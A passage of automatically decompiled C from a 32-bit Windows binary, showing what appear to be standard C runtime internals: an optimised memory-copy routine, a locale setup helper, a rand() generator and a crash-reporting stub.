            // 0x408b5c
            *(char *)v122 = *(char *)v126;
            return result;
        }
        case 2: {
          lab_0x408b68:
            // 0x408b68
            *(char *)v123 = *(char *)v127;
            *(char *)(v123 + 1) = *(char *)(v127 + 1);
            return result;
        }
        case 3: {
          lab_0x408b7c:
            // 0x408b7c
            *(char *)v124 = *(char *)v128;
            *(char *)(v124 + 1) = *(char *)(v128 + 1);
            *(char *)(v124 + 2) = *(char *)(v128 + 2);
            return result;
        }
    }
    // 0x408ddb2
    // UNREACHABLE
}

// Address range: 0x408e60 - 0x4093d4
int32_t function_408e60(int32_t result, int32_t a2, int32_t a3) {
    int32_t v1 = a3 + a2; // 0x408e72
    if (result > a2 == v1 > result) {
        int32_t v2 = a3 + result; // 0x409117
        int32_t v3 = a3; // 0x40911d
        int32_t v4 = v1; // 0x40911d
        int32_t v5 = v2; // 0x40911d
        if (a3 >= 32) {
            // 0x409123
            if ((g114 & 2) == 0) {
                int32_t v6 = v2 & 3; // 0x409131
                int32_t v7 = a3; // 0x409137
                int32_t v8 = v1; // 0x409137
                int32_t v9 = v2; // 0x409137
                if (v6 != 0) {
                    int32_t v10 = v1 - 1; // 0x409140
                    int32_t v11 = v2 - 1; // 0x409143
                    *(char *)v11 = *(char *)v10;
                    int32_t v12 = v6 - 1; // 0x409148
                    int32_t v13 = v12; // 0x40914b
                    int32_t v14 = v10; // 0x40914b
                    int32_t v15 = v11; // 0x40914b
                    while (v12 != 0) {
                        // 0x409140
                        v10 = v14 - 1;
                        v11 = v15 - 1;
                        *(char *)v11 = *(char *)v10;
                        v12 = v13 - 1;
                        v13 = v12;
                        v14 = v10;
                        v15 = v11;
                    }
                    // 0x409156
                    v7 = a3 - v6;
                    v8 = v10;
                    v9 = v11;
                }
                // 0x409156
                __asm_rep_movsd_memcpy((char *)(v9 - 4), (char *)(v8 - 4), v7 / 4);
                g265 = v7 & 3;
                // 0x4090d4
                return result;
            }
            int32_t v16 = a3; // 0x4091cb
            int32_t v17 = v1; // 0x4091cb
            int32_t v18 = v2; // 0x4091cb
            if ((v2 & 15) != 0) {
                int32_t v19 = a3 - 1; // 0x4091cd
                int32_t v20 = v1 - 1; // 0x4091ce
                int32_t v21 = v2 - 1; // 0x4091cf
                *(char *)v21 = *(char *)v20;
                int32_t v22 = v19; // 0x4091da
                int32_t v23 = v20; // 0x4091da
                int32_t v24 = v21; // 0x4091da
                v16 = v19;
                v17 = v20;
                v18 = v21;
                while ((v21 & 15) != 0) {
                    // 0x4091cd
                    v19 = v22 - 1;
                    v20 = v23 - 1;
                    v21 = v24 - 1;
                    *(char *)v21 = *(char *)v20;
                    v22 = v19;
                    v23 = v20;
                    v24 = v21;
                    v16 = v19;
                    v17 = v20;
                    v18 = v21;
                }
            }
            int32_t v25 = v16; // 0x40923e
            int32_t v26 = v18;
            int32_t v27 = v17;
            int32_t v28 = v25; // 0x4091e2
            int32_t v29 = v27; // 0x4091e2
            int32_t v30 = v26; // 0x4091e2
            while (v25 >= 128) {
                int32_t v31 = v27 - 128; // 0x4091e4
                int32_t v32 = v26 - 128; // 0x4091ea
                int128_t v33 = __asm_movdqu_5(*(int128_t *)v31); // 0x4091f0
                int128_t v34 = __asm_movdqu_5(*(int128_t *)(v27 - 112)); // 0x4091f4
                int128_t v35 = __asm_movdqu_5(*(int128_t *)(v27 - 96)); // 0x4091f9
                int128_t v36 = __asm_movdqu_5(*(int128_t *)(v27 - 80)); // 0x4091fe
                int128_t v37 = __asm_movdqu_5(*(int128_t *)(v27 - 64)); // 0x409203
                int128_t v38 = __asm_movdqu_5(*(int128_t *)(v27 - 48)); // 0x409208
                int128_t v39 = __asm_movdqu_5(*(int128_t *)(v27 - 32)); // 0x40920d
                int128_t v40 = __asm_movdqu_5(*(int128_t *)(v27 - 16)); // 0x409212
                __asm_movdqu(*(int128_t *)v32, v33);
                __asm_movdqu(*(int128_t *)(v26 - 112), v34);
                __asm_movdqu(*(int128_t *)(v26 - 96), v35);
                __asm_movdqu(*(int128_t *)(v26 - 80), v36);
                __asm_movdqu(*(int128_t *)(v26 - 64), v37);
                __asm_movdqu(*(int128_t *)(v26 - 48), v38);
                __asm_movdqu(*(int128_t *)(v26 - 32), v39);
                __asm_movdqu(*(int128_t *)(v26 - 16), v40);
                v25 -= 128;
                v28 = v25;
                v29 = v31;
                v30 = v32;
                if (v25 < 128) {
                    // break -> 0x40924c
                    break;
                }
                v26 = v32;
                v27 = v31;
                v28 = v25;
                v29 = v27;
                v30 = v26;
            }
            // 0x40924c
            v3 = v28;
            v4 = v29;
            v5 = v30;
            if (v28 >= 32) {
                int32_t v41 = v29 - 32; // 0x409251
                int32_t v42 = v30 - 32; // 0x409254
                int128_t v43 = __asm_movdqu_5(*(int128_t *)v41); // 0x409257
                int128_t v44 = __asm_movdqu_5(*(int128_t *)(v29 - 16)); // 0x40925b
                __asm_movdqu(*(int128_t *)v42, v43);
                __asm_movdqu(*(int128_t *)(v30 - 16), v44);
                int32_t v45 = v28 - 32; // 0x409269
                int32_t v46 = v45; // 0x409272
                int32_t v47 = v41; // 0x409272
                int32_t v48 = v42; // 0x409272
                v3 = v45;
                v4 = v41;
                v5 = v42;
                while (v45 >= 32) {
                    // 0x409251
                    v41 = v47 - 32;
                    v42 = v48 - 32;
                    v43 = __asm_movdqu_5(*(int128_t *)v41);
                    v44 = __asm_movdqu_5(*(int128_t *)(v47 - 16));
                    __asm_movdqu(*(int128_t *)v42, v43);
                    __asm_movdqu(*(int128_t *)(v48 - 16), v44);
                    v45 = v46 - 32;
                    v46 = v45;
                    v47 = v41;
                    v48 = v42;
                    v3 = v45;
                    v4 = v41;
                    v5 = v42;
                }
            }
        }
        int32_t v49 = v3; // 0x40927a
        int32_t v50 = v4; // 0x40927a
        int32_t v51 = v5; // 0x40927a
        if (v3 >= 4) {
            int32_t v52 = v5 - 4; // 0x40927c
            int32_t v53 = v4 - 4; // 0x40927f
            *(int32_t *)v52 = *(int32_t *)v53;
            int32_t v54 = v3 - 4; // 0x409286
            int32_t v55 = v54; // 0x40928f
            int32_t v56 = v53; // 0x40928f
            int32_t v57 = v52; // 0x40928f
            v49 = v54;
            v50 = v53;
            v51 = v52;
            while (v54 >= 4) {
                // 0x40927c
                v52 = v57 - 4;
                v53 = v56 - 4;
                *(int32_t *)v52 = *(int32_t *)v53;
                v54 = v55 - 4;
                v55 = v54;
                v56 = v53;
                v57 = v52;
                v49 = v54;
                v50 = v53;
                v51 = v52;
            }
        }
        int32_t v58 = v49; // 0x409293
        int32_t v59 = v50; // 0x409293
        if (v49 == 0) {
            // 0x4090d4
            return result;
        }
        int32_t v60 = v51; // 0x409293
        v60--;
        v59--;
        *(char *)v60 = *(char *)v59;
        v58--;
        while (v58 != 0) {
            // 0x409295
            v60--;
            v59--;
            *(char *)v60 = *(char *)v59;
            v58--;
        }
        // 0x4090d4
        return result;
    }
    int32_t v61 = a3; // 0x408e83
    int32_t v62 = a2; // 0x408e83
    int32_t v63 = result; // 0x408e83
    int32_t v64; // 0x408e60
    int32_t v65; // 0x408e60
    int32_t v66; // 0x408e60
    int32_t v67; // bp-8, 0x408e60
    if (a3 < 32) {
        goto lab_0x40935b;
    } else {
        if (a3 >= 128) {
            // 0x408ea4
            if ((g163 & 2) != 0) {
                // 0x408eae
                __asm_rep_movsb_memcpy((char *)result, (char *)a2, a3);
                return result;
            }
            if (((a2 ^ result) & 15) != 0) {
                goto lab_0x408ed0;
            } else {
                // 0x408ec2
                if ((g114 & 2) == 0) {
                    goto lab_0x408ed0;
                } else {
                    int32_t v68 = a2 & 15; // 0x4092b2
                    int32_t v69 = a3; // 0x4092b7
                    int32_t v70 = a2; // 0x4092b7
                    int32_t v71 = result; // 0x4092b7
                    if (v68 != 0) {
                        uint32_t v72 = 16 - v68; // 0x4093a5
                        int32_t v73 = v72 & 3; // 0x4093ae
                        int32_t v74 = a2; // 0x4093b1
                        int32_t v75 = result; // 0x4093b1
                        if (v73 != 0) {
                            *(char *)result = *(char *)a2;
                            int32_t v76 = a2 + 1; // 0x4093b7
                            int32_t v77 = result + 1; // 0x4093b8
                            int32_t v78 = v73 - 1; // 0x4093b9
                            int32_t v79 = v78; // 0x4093ba
                            int32_t v80 = v76; // 0x4093ba
                            int32_t v81 = v77; // 0x4093ba
                            v74 = v76;
                            v75 = v77;
                            while (v78 != 0) {
                                // 0x4093b3
                                *(char *)v81 = *(char *)v80;
                                v76 = v80 + 1;
                                v77 = v81 + 1;
                                v78 = v79 - 1;
                                v79 = v78;
                                v80 = v76;
                                v81 = v77;
                                v74 = v76;
                                v75 = v77;
                            }
                        }
                        int32_t v82 = a3 - v72; // 0x4093a7
                        v69 = v82;
                        v70 = v74;
                        v71 = v75;
                        if (v72 >= 4) {
                            *(int32_t *)v75 = *(int32_t *)v74;
                            int32_t v83 = v74 + 4; // 0x4093c5
                            int32_t v84 = v75 + 4; // 0x4093c8
                            int32_t v85 = v72 / 4 - 1; // 0x4093cb
                            v69 = v82;
                            v70 = v83;
                            v71 = v84;
                            int32_t v86 = v85; // 0x4093cc
                            int32_t v87 = v83; // 0x4093cc
                            int32_t v88 = v84; // 0x4093cc
                            while (v85 != 0) {
                                // 0x4093c1
                                *(int32_t *)v88 = *(int32_t *)v87;
                                v83 = v87 + 4;
                                v84 = v88 + 4;
                                v85 = v86 - 1;
                                v69 = v82;
                                v70 = v83;
                                v71 = v84;
                                v86 = v85;
                                v87 = v83;
                                v88 = v84;
                            }
                        }
                    }
                    int32_t v89 = v70; // 0x4092c5
                    int32_t v90 = v71; // 0x4092c5
                    if (v69 >= 128) {
                        int128_t v91 = __asm_movdqa_4(*(int128_t *)v70); // 0x4092d0
                        int128_t v92 = __asm_movdqa_4(*(int128_t *)(v70 + 16)); // 0x4092d4
                        int128_t v93 = __asm_movdqa_4(*(int128_t *)(v70 + 32)); // 0x4092d9
                        int128_t v94 = __asm_movdqa_4(*(int128_t *)(v70 + 48)); // 0x4092de
                        __asm_movdqa(*(int128_t *)v71, v91);
                        __asm_movdqa(*(int128_t *)(v71 + 16), v92);
                        __asm_movdqa(*(int128_t *)(v71 + 32), v93);
                        __asm_movdqa(*(int128_t *)(v71 + 48), v94);
                        int128_t v95 = __asm_movdqa_4(*(int128_t *)(v70 + 64)); // 0x4092f6
                        int128_t v96 = __asm_movdqa_4(*(int128_t *)(v70 + 80)); // 0x4092fb
                        int128_t v97 = __asm_movdqa_4(*(int128_t *)(v70 + 96)); // 0x409300
                        int128_t v98 = __asm_movdqa_4(*(int128_t *)(v70 + 112)); // 0x409305
                        __asm_movdqa(*(int128_t *)(v71 + 64), v95);
                        __asm_movdqa(*(int128_t *)(v71 + 80), v96);
                        __asm_movdqa(*(int128_t *)(v71 + 96), v97);
                        __asm_movdqa(*(int128_t *)(v71 + 112), v98);
                        int32_t v99 = v70 + 128; // 0x40931e
                        int32_t v100 = v71 + 128; // 0x409324
                        int32_t v101 = v69 / 128 - 1; // 0x40932a
                        int32_t v102 = v101; // 0x40932b
                        int32_t v103 = v99; // 0x40932b
                        int32_t v104 = v100; // 0x40932b
                        v89 = v99;
                        v90 = v100;
                        while (v101 != 0) {
                            // 0x4092d0
                            v91 = __asm_movdqa_4(*(int128_t *)v103);
                            v92 = __asm_movdqa_4(*(int128_t *)(v103 + 16));
                            v93 = __asm_movdqa_4(*(int128_t *)(v103 + 32));
                            v94 = __asm_movdqa_4(*(int128_t *)(v103 + 48));
                            __asm_movdqa(*(int128_t *)v104, v91);
                            __asm_movdqa(*(int128_t *)(v104 + 16), v92);
                            __asm_movdqa(*(int128_t *)(v104 + 32), v93);
                            __asm_movdqa(*(int128_t *)(v104 + 48), v94);
                            v95 = __asm_movdqa_4(*(int128_t *)(v103 + 64));
                            v96 = __asm_movdqa_4(*(int128_t *)(v103 + 80));
                            v97 = __asm_movdqa_4(*(int128_t *)(v103 + 96));
                            v98 = __asm_movdqa_4(*(int128_t *)(v103 + 112));
                            __asm_movdqa(*(int128_t *)(v104 + 64), v95);
                            __asm_movdqa(*(int128_t *)(v104 + 80), v96);
                            __asm_movdqa(*(int128_t *)(v104 + 96), v97);
                            __asm_movdqa(*(int128_t *)(v104 + 112), v98);
                            v99 = v103 + 128;
                            v100 = v104 + 128;
                            v101 = v102 - 1;
                            v102 = v101;
                            v103 = v99;
                            v104 = v100;
                            v89 = v99;
                            v90 = v100;
                        }
                    }
                    int32_t v105 = v69 & 127; // 0x4092bf
                    v65 = v90;
                    v66 = v89;
                    v64 = v105;
                    if (v105 == 0) {
                        // 0x409390
                        return *(int32_t *)((int32_t)&v67 + 12);
                    }
                    goto lab_0x409331;
                }
            }
        } else {
            // 0x408e91
            v65 = result;
            v66 = a2;
            v64 = a3;
            if ((g114 & 2) == 0) {
                goto lab_0x409087;
            } else {
                goto lab_0x409331;
            }
        }
    }
  lab_0x40935b:;
    uint32_t v106 = v61 & 31; // 0x40935b
    if (v106 == 0) {
        // 0x409390
        return *(int32_t *)((int32_t)&v67 + 12);
    }
    int32_t v107 = v62; // 0x409365
    int32_t v108 = v63; // 0x409365
    if (v106 >= 4) {
        *(int32_t *)v63 = *(int32_t *)v62;
        int32_t v109 = v63 + 4; // 0x40936b
        int32_t v110 = v62 + 4; // 0x40936e
        int32_t v111 = v106 / 4 - 1; // 0x409371
        int32_t v112 = v111; // 0x409374
        int32_t v113 = v110; // 0x409374
        int32_t v114 = v109; // 0x409374
        v107 = v110;
        v108 = v109;
        while (v111 != 0) {
            // 0x409367
            *(int32_t *)v114 = *(int32_t *)v113;
            v109 = v114 + 4;
            v110 = v113 + 4;
            v111 = v112 - 1;
            v112 = v111;
            v113 = v110;
            v114 = v109;
            v107 = v110;
            v108 = v109;
        }
    }
    int32_t v115 = v61 & 3; // 0x409378
    int32_t v116 = v107; // 0x40937b
    if (v115 == 0) {
        // 0x409390
        return *(int32_t *)((int32_t)&v67 + 12);
    }
    int32_t v117 = v108; // 0x40937b
    *(char *)v117 = *(char *)v116;
    int32_t v118 = v115 - 1; // 0x409383
    int32_t v119 = v118; // 0x409384
    v116++;
    v117++;
    while (v118 != 0) {
        // 0x40937d
        *(char *)v117 = *(char *)v116;
        v118 = v119 - 1;
        v119 = v118;
        v116++;
        v117++;
    }
    // 0x409390
    return *(int32_t *)((int32_t)&v67 + 12);
  lab_0x408ed0:;
    int32_t v120; // 0x408e60
    int32_t v121; // 0x408e60
    int32_t v122; // 0x408e60
    int32_t v123; // 0x408e60
    int32_t v124; // 0x408e60
    int32_t v125; // 0x408e60
    int32_t v126; // 0x408e60
    int32_t v127; // 0x408e60
    int32_t v128; // 0x408e60
    if ((g163 & 1) == 0) {
        goto lab_0x409087;
    } else {
        if ((result & 3) != 0) {
            goto lab_0x409087;
        } else {
            // 0x408eea
            v120 = a3;
            v128 = a2;
            v124 = result;
            if ((a2 & 3) == 0) {
                int32_t v129 = a3; // 0x408efa
                int32_t v130 = a2; // 0x408efa
                int32_t v131 = result; // 0x408efa
                if ((result & 4) != 0) {
                    // 0x408efc
                    *(int32_t *)result = *(int32_t *)a2;
                    v129 = a3 - 4;
                    v130 = a2 + 4;
                    v131 = result + 4;
                }
                int32_t v132 = v129; // 0x408f0d
                int32_t v133 = v130; // 0x408f0d
                int32_t v134 = v131; // 0x408f0d
                if ((v131 & 8) != 0) {
                    // 0x408f0f
                    __asm_movq_3(*(int64_t *)v131, __asm_movq(*(int64_t *)v130));
                    v132 = v129 - 8;
                    v133 = v130 + 8;
                    v134 = v131 + 8;
                }
                // 0x408f20
                int32_t v135; // 0x408e60
                int32_t v136; // 0x408e60
                int32_t v137; // 0x408e60
                if ((v133 & 7) == 0) {
                    int32_t v138 = v133 - 8; // 0x408f8d
                    int128_t v139 = __asm_movdqa_4(*(int128_t *)v138); // 0x408f95
                    int32_t v140 = v138;
                    int128_t v141 = __asm_movdqa_4(*(int128_t *)(v140 + 16)); // 0x408f98
                    int32_t v142 = v132 - 48; // 0x408f9d
                    int128_t v143 = __asm_movdqa_4(*(int128_t *)(v140 + 32)); // 0x408fa0
                    int32_t v144 = v140 + 48; // 0x408fa5
                    int128_t v145 = __asm_movdqa_4(*(int128_t *)v144); // 0x408fa5
                    int128_t v146 = __asm_movdqa_4(v141); // 0x408fb0
                    __asm_movdqa(*(int128_t *)v134, __asm_palignr(v141, v139, 8));
                    int128_t v147 = __asm_movdqa_4(v143); // 0x408fbe
                    __asm_movdqa(*(int128_t *)(v134 + 16), __asm_palignr(v143, v146, 8));
                    v139 = __asm_movdqa_4(v145);
                    __asm_movdqa(*(int128_t *)(v134 + 32), __asm_palignr(v145, v147, 8));
                    int32_t v148 = v134 + 48; // 0x408fdc
                    int32_t v149 = v142; // 0x408fdf
                    int32_t v150 = v148; // 0x408fdf
                    while (v142 > 47) {
                        // 0x408f98
                        v140 = v144;
                        v141 = __asm_movdqa_4(*(int128_t *)(v140 + 16));
                        v142 = v149 - 48;
                        v143 = __asm_movdqa_4(*(int128_t *)(v140 + 32));
                        v144 = v140 + 48;
                        v145 = __asm_movdqa_4(*(int128_t *)v144);
                        v146 = __asm_movdqa_4(v141);
                        __asm_movdqa(*(int128_t *)v150, __asm_palignr(v141, v139, 8));
                        v147 = __asm_movdqa_4(v143);
                        __asm_movdqa(*(int128_t *)(v150 + 16), __asm_palignr(v143, v146, 8));
                        v139 = __asm_movdqa_4(v145);
                        __asm_movdqa(*(int128_t *)(v150 + 32), __asm_palignr(v145, v147, 8));
                        v148 = v150 + 48;
                        v149 = v142;
                        v150 = v148;
                    }
                    // 0x408fe1
                    v135 = v142;
                    v137 = v140 + 56;
                    v136 = v148;
                } else {
                    if ((v133 & 8) == 0) {
                        int32_t v151 = v133 - 4; // 0x408fe6
                        int128_t v152 = __asm_movdqa_4(*(int128_t *)v151); // 0x408fee
                        int32_t v153 = v151;
                        int128_t v154 = __asm_movdqa_4(*(int128_t *)(v153 + 16)); // 0x408ff0
                        int32_t v155 = v132 - 48; // 0x408ff5
                        int128_t v156 = __asm_movdqa_4(*(int128_t *)(v153 + 32)); // 0x408ff8
                        int32_t v157 = v153 + 48; // 0x408ffd
                        int128_t v158 = __asm_movdqa_4(*(int128_t *)v157); // 0x408ffd
                        int128_t v159 = __asm_movdqa_4(v154); // 0x409008
                        __asm_movdqa(*(int128_t *)v134, __asm_palignr(v154, v152, 4));
                        int128_t v160 = __asm_movdqa_4(v156); // 0x409016
                        __asm_movdqa(*(int128_t *)(v134 + 16), __asm_palignr(v156, v159, 4));
                        v152 = __asm_movdqa_4(v158);
                        __asm_movdqa(*(int128_t *)(v134 + 32), __asm_palignr(v158, v160, 4));
                        int32_t v161 = v134 + 48; // 0x409034
                        int32_t v162 = v155; // 0x409037
                        int32_t v163 = v161; // 0x409037
                        while (v155 > 47) {
                            // 0x408ff0
                            v153 = v157;
                            v154 = __asm_movdqa_4(*(int128_t *)(v153 + 16));
                            v155 = v162 - 48;
                            v156 = __asm_movdqa_4(*(int128_t *)(v153 + 32));
                            v157 = v153 + 48;
                            v158 = __asm_movdqa_4(*(int128_t *)v157);
                            v159 = __asm_movdqa_4(v154);
                            __asm_movdqa(*(int128_t *)v163, __asm_palignr(v154, v152, 4));
                            v160 = __asm_movdqa_4(v156);
                            __asm_movdqa(*(int128_t *)(v163 + 16), __asm_palignr(v156, v159, 4));
                            v152 = __asm_movdqa_4(v158);
                            __asm_movdqa(*(int128_t *)(v163 + 32), __asm_palignr(v158, v160, 4));
                            v161 = v163 + 48;
                            v162 = v155;
                            v163 = v161;
                        }
                        // 0x409039
                        v135 = v155;
                        v137 = v153 + 52;
                        v136 = v161;
                    } else {
                        int32_t v164 = v133 - 12; // 0x408f32
                        int128_t v165 = __asm_movdqa_4(*(int128_t *)v164); // 0x408f3a
                        int32_t v166 = v164;
                        int128_t v167 = __asm_movdqa_4(*(int128_t *)(v166 + 16)); // 0x408f3c
                        int32_t v168 = v132 - 48; // 0x408f41
                        int128_t v169 = __asm_movdqa_4(*(int128_t *)(v166 + 32)); // 0x408f44
                        int32_t v170 = v166 + 48; // 0x408f49
                        int128_t v171 = __asm_movdqa_4(*(int128_t *)v170); // 0x408f49
                        int128_t v172 = __asm_movdqa_4(v167); // 0x408f54
                        __asm_movdqa(*(int128_t *)v134, __asm_palignr(v167, v165, 12));
                        int128_t v173 = __asm_movdqa_4(v169); // 0x408f62
                        __asm_movdqa(*(int128_t *)(v134 + 16), __asm_palignr(v169, v172, 12));
                        v165 = __asm_movdqa_4(v171);
                        __asm_movdqa(*(int128_t *)(v134 + 32), __asm_palignr(v171, v173, 12));
                        int32_t v174 = v134 + 48; // 0x408f80
                        int32_t v175 = v168; // 0x408f83
                        int32_t v176 = v174; // 0x408f83
                        while (v168 > 47) {
                            // 0x408f3c
                            v166 = v170;
                            v167 = __asm_movdqa_4(*(int128_t *)(v166 + 16));
                            v168 = v175 - 48;
                            v169 = __asm_movdqa_4(*(int128_t *)(v166 + 32));
                            v170 = v166 + 48;
                            v171 = __asm_movdqa_4(*(int128_t *)v170);
                            v172 = __asm_movdqa_4(v167);
                            __asm_movdqa(*(int128_t *)v176, __asm_palignr(v167, v165, 12));
                            v173 = __asm_movdqa_4(v169);
                            __asm_movdqa(*(int128_t *)(v176 + 16), __asm_palignr(v169, v172, 12));
                            v165 = __asm_movdqa_4(v171);
                            __asm_movdqa(*(int128_t *)(v176 + 32), __asm_palignr(v171, v173, 12));
                            v174 = v176 + 48;
                            v175 = v168;
                            v176 = v174;
                        }
                        // 0x408f85
                        v135 = v168;
                        v137 = v166 + 60;
                        v136 = v174;
                    }
                }
                int32_t v177 = v135; // 0x40903f
                int32_t v178 = v137; // 0x40903f
                int32_t v179 = v136; // 0x40903f
                if (v135 >= 16) {
                    int128_t v180 = __asm_movdqu_5(*(int128_t *)v137); // 0x409041
                    int32_t v181 = v135 - 16; // 0x409045
                    int32_t v182 = v137 + 16; // 0x409048
                    __asm_movdqa(*(int128_t *)v136, v180);
                    int32_t v183 = v136 + 16; // 0x40904f
                    int32_t v184 = v183; // 0x40903f
                    int32_t v185 = v182; // 0x40903f
                    int32_t v186 = v181; // 0x40903f
                    while (v181 >= 16) {
                        // 0x409041
                        v180 = __asm_movdqu_5(*(int128_t *)v185);
                        v181 = v186 - 16;
                        v182 = v185 + 16;
                        __asm_movdqa(*(int128_t *)v184, v180);
                        v183 = v184 + 16;
                        v184 = v183;
                        v185 = v182;
                        v186 = v181;
                    }
                    // 0x40903c
                    v177 = v135 & 15;
                    v178 = v182;
                    v179 = v183;
                }
                int32_t v187 = v177; // 0x409058
                int32_t v188 = v178; // 0x409058
                int32_t v189 = v179; // 0x409058
                if ((v177 & 4) != 0) {
                    // 0x40905a
                    *(int32_t *)v179 = *(int32_t *)v178;
                    v187 = v177 - 4;
                    v188 = v178 + 4;
                    v189 = v179 + 4;
                }
                int32_t v190 = v187; // 0x408e60
                int32_t v191 = v188; // 0x408e60
                int32_t v192 = v189; // 0x408e60
                while (true) {
                  lab_0x40907e:
                    // 0x40907e
                    g263 = v190;
                    v125 = v191;
                    v121 = v192;
                    v126 = v191;
                    v122 = v192;
                    v127 = v191;
                    v123 = v192;
                    switch (v190) {
                        case 0: {
                            return result;
                        }
                        case 1: {
                            goto lab_0x4090dc;
                        }
                        case 2: {
                            goto lab_0x4090e8;
                        }
                        case 3: {
                            goto lab_0x4090fc;
                        }
                        default: {
                            // 0x40906d
                            __asm_movq_3(*(int64_t *)v192, __asm_movq(*(int64_t *)v191));
                            v190 -= 8;
                            v191 += 8;
                            v192 += 8;
                            goto lab_0x40907e;
                        }
                    }
                }
                // 0x4090d4
                return result;
            }
            goto lab_0x4090a2;
        }
    }
  lab_0x409087:
    // 0x409087
    v120 = a3;
    v128 = a2;
    v124 = result;
    if ((result & 3) != 0) {
        *(char *)result = *(char *)a2;
        int32_t v193 = a3 - 1; // 0x409093
        int32_t v194 = a2 + 1; // 0x409094
        int32_t v195 = result + 1; // 0x409097
        int32_t v196 = v193; // 0x4090a0
        int32_t v197 = v194; // 0x4090a0
        int32_t v198 = v195; // 0x4090a0
        v120 = v193;
        v128 = v194;
        v124 = v195;
        while ((v195 & 3) != 0) {
            // 0x40908f
            *(char *)v198 = *(char *)v197;
            v193 = v196 - 1;
            v194 = v197 + 1;
            v195 = v198 + 1;
            v196 = v193;
            v197 = v194;
            v198 = v195;
            v120 = v193;
            v128 = v194;
            v124 = v195;
        }
    }
    goto lab_0x4090a2;
  lab_0x409331:
    // 0x409331
    v61 = v64;
    v62 = v66;
    v63 = v65;
    if (v64 >= 32) {
        int128_t v203 = __asm_movdqu_5(*(int128_t *)v66); // 0x409340
        int128_t v204 = __asm_movdqu_5(*(int128_t *)(v66 + 16)); // 0x409344
        __asm_movdqu(*(int128_t *)v65, v203);
        __asm_movdqu(*(int128_t *)(v65 + 16), v204);
        int32_t v205 = v66 + 32; // 0x409352
        int32_t v206 = v65 + 32; // 0x409355
        int32_t v207 = v64 / 32 - 1; // 0x409358
        int32_t v208 = v207; // 0x409359
        int32_t v209 = v205; // 0x409359
        int32_t v210 = v206; // 0x409359
        v61 = v64;
        v62 = v205;
        v63 = v206;
        while (v207 != 0) {
            // 0x409340
            v203 = __asm_movdqu_5(*(int128_t *)v209);
            v204 = __asm_movdqu_5(*(int128_t *)(v209 + 16));
            __asm_movdqu(*(int128_t *)v210, v203);
            __asm_movdqu(*(int128_t *)(v210 + 16), v204);
            v205 = v209 + 32;
            v206 = v210 + 32;
            v207 = v208 - 1;
            v208 = v207;
            v209 = v205;
            v210 = v206;
            v61 = v64;
            v62 = v205;
            v63 = v206;
        }
    }
    goto lab_0x40935b;
  lab_0x4090a2:;
    uint32_t v199 = v120 / 4; // 0x4090ad
    __asm_rep_movsd_memcpy((char *)v124, (char *)v128, v199);
    bool v200; // 0x408e60
    int32_t v201 = v124 + v199 * (v200 ? -4 : 4); // 0x4090b0
    int32_t v202 = v120 & 3; // 0x4090b2
    g264 = v202;
    v125 = v201;
    v121 = v201;
    v126 = v201;
    v122 = v201;
    v127 = v201;
    v123 = v201;
    switch (v202) {
        case 0: {
            // 0x4090d4
            return result;
        }
        case 1: {
          lab_0x4090dc:
            // 0x4090dc
            *(char *)v121 = *(char *)v125;
            return result;
        }
        case 2: {
          lab_0x4090e8:
            // 0x4090e8
            *(char *)v122 = *(char *)v126;
            *(char *)(v122 + 1) = *(char *)(v126 + 1);
            return result;
        }
        case 3: {
          lab_0x4090fc:
            // 0x4090fc
            *(char *)v123 = *(char *)v127;
            *(char *)(v123 + 1) = *(char *)(v127 + 1);
            *(char *)(v123 + 2) = *(char *)(v127 + 2);
            return result;
        }
    }
    // 0x40935b2
    // UNREACHABLE
}

// Address range: 0x4093d4 - 0x409457
int32_t function_4093d4(int32_t a1, int32_t a2) {
    // 0x4093d4
    int32_t result; // 0x4093d4
    char * v1 = (char *)(result + 12); // 0x4093df
    *v1 = 0;
    if (a1 != 0) {
        // 0x4093e7
        *(int32_t *)(result + 4) = *(int32_t *)a1;
        // 0x409407
        *(int32_t *)(result + 8) = *(int32_t *)(a1 + 4);
        // 0x409450
        return result;
    }
    // 0x4093f1
    if (g199 == 0) {
        // 0x4093fa
        *(int32_t *)(result + 4) = *(int32_t *)0x4261d0;
        // 0x409407
        *(int32_t *)(result + 8) = (int32_t)g123;
        // 0x409450
        return result;
    }
    int32_t v2 = function_40ba33(); // 0x40940d
    int32_t v3 = result + 4; // 0x409412
    *(int32_t *)result = v2;
    int32_t v4 = result + 8; // 0x409418
    *(int32_t *)v3 = *(int32_t *)(v2 + 76);
    int32_t v5 = *(int32_t *)(v2 + 72); // 0x409420
    *(int32_t *)v4 = v5;
    function_40bb82(v2, v3);
    function_40bbaf(v5, v4);
    int32_t * v6 = (int32_t *)(v5 + 848); // 0x409438
    int32_t v7 = *v6; // 0x409438
    if ((v7 & 2) == 0) {
        // 0x409443
        *v6 = v7 | 2;
        *v1 = 1;
    }
    // 0x409450
    return result;
}

// Address range: 0x409457 - 0x409478
int32_t function_409457(void) {
    int32_t * v1 = (int32_t *)(function_40ba33() + 24); // 0x40945c
    uint32_t v2 = 0x343fd * *v1 + 0x269ec3; // 0x409463
    *v1 = v2;
    return v2 / 0x10000 & 0x7fff;
}

// Address range: 0x409478 - 0x4094a9
int32_t function_409478(int32_t a1) {
    // 0x409478
    uint32_t v1; // 0x409478
    int32_t result = (bool)(v1 < 0xfffffffc);
    if (v1 >= 0xfffffffc) {
        // 0x4094a4
        return result;
    }
    int32_t v2 = 0; // 0x409495
    v2++;
    int32_t v3; // 0x409478
    *(int32_t *)v3 = a1;
    v3 += 4;
    while (v2 != result) {
        // 0x40949a
        v2++;
        *(int32_t *)v3 = a1;
        v3 += 4;
    }
    // 0x4094a4
    return result;
}

// Address range: 0x4094a9 - 0x4095e4
int32_t function_4094a9(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    if (a2 != -1) {
        // 0x4094c5
        function_4065a6(a2);
    }
    // 0x4094ce
    int32_t v1; // bp-804, 0x4094a9
    function_4071b0(&v1, 0, 80);
    int32_t v2; // bp-724, 0x4094a9
    function_4071b0(&v2, 0, 716);
    int32_t ExceptionInfo = &v1; // bp-812, 0x4094fa
    v2 = 0x10001;
    v1 = a3;
    bool v3 = IsDebuggerPresent(); // 0x4095a1
    SetUnhandledExceptionFilter(NULL);
    if (UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo) != 0) {
        // 0x4095d5
        return function_4065ae();
    }
    if (a2 != -1 && !v3) {
        // 0x4095cc
        function_4065a6(a2);
    }
    // 0x4095d5
    return function_4065ae();
}

// Address range: 0x4095e4 - 0x4095e5
int32_t function_4095e4(int32_t a1, int32_t a2) {
    // 0x4095e4
    int32_t result; // 0x4095e4
    return result;
}

